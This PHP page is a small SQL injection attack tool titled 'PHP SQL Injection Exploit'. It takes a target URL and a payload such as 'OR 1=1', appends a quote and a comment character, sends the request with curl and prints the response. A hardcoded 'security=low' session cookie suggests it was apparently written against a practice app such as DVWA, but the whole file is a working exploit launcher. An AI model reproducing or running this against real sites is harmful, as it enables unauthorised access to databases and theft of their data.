<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP SQL Injection Exploit</title> <!-- Title of the page -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css"> <!-- Link to Tailwind CSS -->
    <link rel="icon" href="https://i.hizliresim.com/6kjk1mb.png" type="image/png"> <!-- Favicon for the page -->
</head>
<body class="bg-gray-900 text-white flex flex-col justify-center items-center h-screen"> <!-- Styling for the body -->
    <img src="https://i.hizliresim.com/6kjk1mb.png" alt="tht-arge" class="w-24 h-24 mb-8"> <!-- Image logo -->
    <p class="text-lg">PHP For Hackers \ PHP Exploit</p> <!-- Page heading -->

    <div class="mt-8">
        <form action="sqli.php" method="post"> <!-- Form for submitting data -->
            <label for="vulnerpage" class="block mb-2">Vulnerable Link</label> <!-- Label for vulnerable link input -->
                <input type="text" name="vulnerpage" class="w-full py-2 px-3 mb-4 rounded-lg focus:outline-none focus:ring focus:border-blue-300 bg-gray-800" size="50"> <!-- Input for vulnerable link -->
                    <label for="payload" class="block mb-2">Poc Payload OR 1=1</label> <!-- Label for SQL injection payload input -->
                <input type="text" name="sqlipayload" class="w-35 py-2 px-4 mb-4 rounded-lg focus:outline-none focus:ring focus:border-blue-300 bg-gray-800"> <!-- Input for SQL injection payload -->
            <button type="submit" class="bg-blue-800 hover:bg-blue-500 text-white py-2 px-3 rounded-lg" name="sendrequests">Send</button> <!-- Button for submitting the form -->
        </form>
    </div>

    <?php
    if (isset($_POST["sendrequests"])) { // Check if form is submitted

        $vulnerpage = $_POST["vulnerpage"]; // Get vulnerable page URL
        $sqlipayload = $_POST["sqlipayload"]; // Get SQL injection payload
        $sqlipayload = urlencode($sqlipayload); // Encode the payload for URL
      
        $hacked = $vulnerpage."1'".$sqlipayload."%23"."&Submit=Submit#"; // Construct the exploit URL
        
        echo "Request sent: " . htmlspecialchars($hacked); // Display the request sent
        
        $curl = curl_init(); // Initialize CURL session

        curl_setopt_array($curl, [ // Set CURL options
            CURLOPT_URL => $hacked, // Set the URL to fetch
            CURLOPT_RETURNTRANSFER => true, // Return the transfer as a string
            CURLOPT_COOKIE => "security=low; PHPSESSID=glhrmefqaqtjsjisv1kccbqm6a" // Set the cookie values
        ]);

        $result = curl_exec($curl); // Perform the CURL session
        echo $result; // Display the result
        curl_close($curl); // Close the CURL session
    }
    ?>

</body>
</html>
